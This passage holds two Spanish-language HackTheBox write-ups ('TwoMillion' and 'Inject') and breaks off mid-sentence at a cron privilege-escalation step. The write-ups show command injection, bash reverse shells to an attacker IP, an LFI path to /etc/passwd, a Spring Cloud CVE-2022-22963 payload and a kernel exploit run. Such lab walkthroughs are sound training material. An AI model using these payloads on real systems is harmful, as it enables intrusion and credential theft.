&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver solo 2 servicios expuestos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 Perteneciente a un OpenSSH de un sistema &lt;strong&gt;Ubuntu&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;80 Perteneciente a HTTP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si le tiramos una herramienta de reconocimiento web, veremos que no la IP nos hace un &lt;strong&gt;redirect&lt;/strong&gt; a un host, que vamos a tener que agregarlo al &lt;strong&gt;/etc/hosts&lt;/strong&gt;
Lo podemos hacer de manera rapida con un:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IP&amp;gt; 2million.htb&quot;&lt;/span&gt; | tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al ir a la pagina, podremos ver una interfaz… Interesante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que nos llama la atencion aqui, es que:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Hay un panel de &lt;strong&gt;LOGIN&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Hay un panel de &lt;strong&gt;JOIN&lt;/strong&gt;, que seria el equivalente a un registro.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si vamos al panel de &lt;strong&gt;JOIN&lt;/strong&gt;, veremos lo siguiente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;intrusion&quot;&gt;Intrusion&lt;/h2&gt;

&lt;p&gt;Si damos un &lt;strong&gt;CTL+U&lt;/strong&gt;, podremos ver el codigo fuente de la pagina… Y nos toparemos con algo interesante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vemos la funcion &lt;strong&gt;inviteapi.min.js&lt;/strong&gt;, veremos lo siguiente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos la linea interesante de:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invite&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;verifyInviteCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeInviteCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;how&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;generate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;verify&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Asi que podemos interactuar con la consola usando &lt;strong&gt;verifyInviteCode&lt;/strong&gt; y tambien &lt;strong&gt;makeInviteCode&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que esta encriptado en &lt;strong&gt;ROT13&lt;/strong&gt; o cifrado CESAR.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Resumiendo el cifrado &lt;strong&gt;CESAR&lt;/strong&gt;, tomas las letras del alfabeto, les asigna una posicion &lt;strong&gt;numerica&lt;/strong&gt;  y las va rotando de acuerdo a su posicion, ejemplificando rapido… Si tenemos una ROT13, y queremos encriptar un &lt;strong&gt;“HOLA”&lt;/strong&gt;, aplicando del cifrado &lt;strong&gt;CESAR&lt;/strong&gt;, tendremos como resultado un: &lt;strong&gt;“UBYN”&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bueno, si la desciframos obtendremos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que nos pide que hagamos una peticion por el metodo &lt;strong&gt;POST&lt;/strong&gt; a la direccion: &lt;strong&gt;/api/v1/invite/generate&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST http://2million.htb/api/v1/invite/generate
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si lo hacemos, obtendemos un codigo en &lt;strong&gt;base64&lt;/strong&gt;, por lo que debemos desencriptarlo y obtendemos el codigo de invitacion:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Solo nos queda registarnos y logearnos en la pagina:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez dentro veremos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que nos interesa es el apartado de &lt;strong&gt;ACCESS&lt;/strong&gt;, esto se debe a que aqui es donde creamos y descargamos nuestra &lt;strong&gt;VPN&lt;/strong&gt;, pero no olvidemos que se aplica una query a la API del servicio.&lt;/p&gt;

&lt;p&gt;Abrimos &lt;strong&gt;BURPSUITE&lt;/strong&gt; e interceptamos la peticion:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que le hace un &lt;strong&gt;GET&lt;/strong&gt; a la API, pero queremos enumerar consultas interesantes, asi que vamos directamente a la API, tirando el &lt;strong&gt;GET&lt;/strong&gt; a la ruta: &lt;strong&gt;“/api/v1”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos algunos metodos interesante, en especial los de tipo &lt;strong&gt;admin&lt;/strong&gt;, por lo que vamos a aprovecharnos de eso:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al atentar contra la ruta: &lt;strong&gt;“/api/v1/admin/settings/update”&lt;/strong&gt;, vemos que el mensaje es “Invalid CONTENT TYPE”, por lo que nos da indicios que deberiamos pasar parametros, asi que indicamos un &lt;strong&gt;Content-Type: application/json&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Veremos que ahora nos pide un parametro: &lt;strong&gt;email&lt;/strong&gt;, por lo que lo introduciremos a nuestro cuerpo JSON.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora nos pide el parametro: &lt;strong&gt;is_admin&lt;/strong&gt;, por lo que podemos decir que es una variable tipo Booleana, es decir: &lt;strong&gt;1 or 0&lt;/strong&gt;, o tambien &lt;strong&gt;TRUE o FALSE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM18.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM19.png&quot; alt=&quot;&quot; /&gt;
Ahora vemos que nos hemos vuelto administradores, por lo que atentaremos contra la ruta de generar VPN pero del administrador:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora tendremos que ver una forma de escapar comandos, por lo que podemos intentar poner un “;” y un “#” al final del parametro, esto debido a que el “;” creara una escapada de comando, y el “#” a comentar el resto de la peticion:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver, ahora tenemos ejecucion remota de comandos (RCE), por lo que queda ganar acceso a la maquina.&lt;/p&gt;

&lt;p&gt;No olvidemos la reverse shell basica en &lt;strong&gt;bash&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp;/dev/tcp/&amp;lt;TU IP&amp;gt;/&amp;lt;TU PUERTO&amp;gt; 0&amp;gt;&amp;amp;1'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que ganamos acceso como el usuario &lt;strong&gt;“www-data”&lt;/strong&gt;, por lo que nos queda escalar privilegios al usuario y luego al root.&lt;/p&gt;

&lt;p&gt;Si vemos, estamos dentro del directorio de la pagina web, listamos todos los archivos, vemos un listado interesante:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Database.php&lt;/li&gt;
  &lt;li&gt;Router.php&lt;/li&gt;
  &lt;li&gt;index.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pero si los leemos, nos daremos cuenta, que llama a una variable privada, por lo que nos vamos a poner a analizar todos esos archivos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos vamos a topar algo interesante dentro del archivo &lt;strong&gt;index&lt;/strong&gt;, en lo que parece ser un &lt;strong&gt;archivo de entorno php&lt;/strong&gt;, si deseas leer mas de esto, dale &lt;a href=&quot;https://desarrolloweb.com/articulos/variables-entorno-php-env.html&quot;&gt;click aqui&lt;/a&gt;, el caso:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$envFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.env'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$envFile&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$dbHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$dbName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_DATABASE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$dbUser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USERNAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$dbPass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Por lo que podemos deducir, que hay un archivo oculto, asi que vemos archivos ocultos y sorpresa:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que ya tenemos las credenciales del &lt;strong&gt;USUARIO NO PRIVILEGIADO&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios-privesc&quot;&gt;Escalada de Privilegios (PRIVESC)&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez como el usuario “admin”, nos tocara investigar cositas… Pero ahorrando trabajo, no tenemos permisos a nivel de &lt;strong&gt;SUDOERS&lt;/strong&gt;, pero podemos ver algo interesante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que estamos contra un Kernel un tanto curioso… Si hacemos una busqueda rapida por &lt;strong&gt;Google&lt;/strong&gt;, nos toparemos con unos CVE que nos indican una escalada de privilegios:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Aqui tenemos el link de actualizacion de seguridad de &lt;a href=&quot;https://ubuntu.com/security/notices/LSN-0095-1&quot;&gt;UBUNTU&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Aqui: &lt;a href=&quot;https://github.com/sxlmnwb/CVE-2023-0386&quot;&gt;Link del CVE Usado&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bueno, mostrado esto:&lt;/p&gt;
&lt;h3 id=&quot;cve-2023-0386&quot;&gt;CVE-2023-0386&lt;/h3&gt;
&lt;p&gt;Explicado de manera resumida, aprovecha la mala implementacion de un complemento: &lt;strong&gt;“OverlayFS”&lt;/strong&gt;, este permite lectura y escritura dentro de un arbol de directorios.&lt;/p&gt;

&lt;p&gt;Lo traeremos a la maquina victima, dentro del directorio &lt;strong&gt;/tmp&lt;/strong&gt; y lo ejecutaremos como indica en su repo de GitHub:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make all&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ./fuse ./ovlcap/lower ./gc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y en otra terminal, corremos el ./exp y ya tendremos acceso como &lt;strong&gt;ROOT&lt;/strong&gt;, por lo que podemos decir… Maquina superada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>al3xt0r</name></author><category term="CTF" /><category term="HackTheBox" /><category term="WriteUp" /><category term="RCE" /><summary></summary></entry><entry><title>HTB - Inject</title><link href="http://localhost:4000/HTB-Inject/" rel="alternate" type="text/html" title="HTB - Inject" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/HTB-Inject/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;en-esta-maquina-veremos&quot;&gt;En esta maquina veremos:&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Scan de puertos&lt;/li&gt;
  &lt;li&gt;LFI - Local File Inclusion&lt;/li&gt;
  &lt;li&gt;Explotando funciones CRON&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;primer-paso-port-scanning&quot;&gt;Primer paso: PORT SCANNING&lt;/h3&gt;

&lt;p&gt;Vamos a usar la herramienta nmap, ya sabemos que hay muchas combinaciones, pero me gusta usar esta por la rapidez:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;Ip de la Maquina&amp;gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; &amp;lt;Nombre del archivo que contendra la informacion&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Aunque tambien podemos usar:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &amp;lt;IP Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;A estos puertos le pasaremos un scan de &lt;strong&gt;reconocimiento&lt;/strong&gt;, pero esta vez del servicio y versiones que corren tras la pagina.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&amp;lt;Puertos&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como sea, obtendemos lo siguiente:
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-PORTS.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver cosas interesantes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;El puerto 22 (Perteneciente al SSH) esta abierto.&lt;/li&gt;
  &lt;li&gt;No se emplea un puerto 80 o un 443 para mostrar la pagina, sino, un servicio web-proxy en el puerto &lt;strong&gt;8080&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si vamos a esa puerto, podremos ver una interfaz de subida de archivos.
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-UI.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si es que subimos un archivo &lt;strong&gt;test&lt;/strong&gt;, por ejemplo, nos dejara buscar por un paramentro:&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;http://&amp;lt;IP&amp;gt;:8080/show_image?img=
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Entonces, vamos a interceptar la peticion con la herramienta &lt;strong&gt;BURPSUITE&lt;/strong&gt;, para hacer test a ese parametro.&lt;/p&gt;

&lt;p&gt;En este caso usaremos un LFI clasico, “../../../etc/passwd”, esto para listar posibles ususarios dentro del sistema:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-Burp1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que existe un usuario &lt;strong&gt;frank&lt;/strong&gt; y otro usuario &lt;strong&gt;phil&lt;/strong&gt;, pero realmente lo que ahora queremos hallar es la version del framework que usa esta aplicacion, asi que con &lt;strong&gt;Burpsuite&lt;/strong&gt;, nos ponemos a listar los directorios, hasta toparnos con:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-Burp2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos cosas interesantes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Un Spring Framework&lt;/li&gt;
  &lt;li&gt;La version usada es muy antigua (2.6.5)
Si buscamos nos toparemos con un CVE, el &lt;strong&gt;CVE-2022-22963&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;cve-2022-22963&quot;&gt;CVE-2022-22963&lt;/h3&gt;
&lt;p&gt;Puedes usar la &lt;a href=&quot;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&quot;&gt;herramienta que yo use&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Pero si vamos a fondo, este &lt;strong&gt;CVE-2022-22963&lt;/strong&gt;, explicado de forma rapida… Emplea un fallo de implementacion, atacando una ruta en especifico &lt;strong&gt;“/functionRouter”&lt;/strong&gt;, dentro del servicio.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Le carga a la cabecera: ‘spring.cloud.function.routing-expression’, nuestro payload (En este caso una reverse shell), y la crea en el directorio temporal de la maquina.
Y bueno el comando que le carga en cuestion es el siguiente:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;' + ((str(base64.b64encode(command.encode('&lt;/span&gt;utf-8&lt;span class=&quot;s1&quot;&gt;')))).strip('&lt;/span&gt;b&lt;span class=&quot;s1&quot;&gt;')).strip(&quot;'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;) + '}|{base64,-d}|{bash,-i}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;Donde &lt;strong&gt;command&lt;/strong&gt; contiene nuestra reverse shell.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;continuando&quot;&gt;Continuando:&lt;/h3&gt;

&lt;p&gt;Podemos ver que ha funcionado:
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-CVE.jpeg&quot; alt=&quot;&quot; /&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-Burp3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que ahora queda ponernos en escucha con la herramienta &lt;strong&gt;netcat&lt;/strong&gt; o si queremos ahorrarnos tratar la tty, con &lt;strong&gt;pwncat-cs&lt;/strong&gt;.
&lt;img src=&quot;/assets/img/HTB_Injection/Injection-RS.jpeg&quot; alt=&quot;&quot; /&gt;
Si vamos investigando dentro del directorio principal del usuario &lt;strong&gt;frank&lt;/strong&gt;, vamos a toparnos con un directorio “.m2/” que contendra un archivo interesante: “settings.xml”, este contendra la password del usuario &lt;strong&gt;phil&lt;/strong&gt; (Que de igual forma podremos listar con &lt;strong&gt;burpsuite&lt;/strong&gt;):
&lt;img src=&quot;/assets/img/HTB_Injection/InjectionRS2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como ya tenemos usuario y password de &lt;strong&gt;phil&lt;/strong&gt;, simplemente ingresamos a su cuenta y solo nos quedaria usar una herramienta de reconocimiento para ver lo que sucede detras del sistema:&lt;/p&gt;

&lt;p&gt;Podemos usar perfectamente:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;O por otro lado, servirnos de la herramienta &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;&lt;strong&gt;pspy64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-PSPY.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y nos vamos a topar con algo interesante, hay un proceso que parece ejecutar una tarea cron, que apunta a un directorio que contiene formatos .yml&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Injection-CRON.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que si vamos a es ruta, vamos a poder ver que tenemos permisos de escritura, por lo que le introducimos nuestra escalada de privilegios de la siguiente forma:&lt;/p&gt;

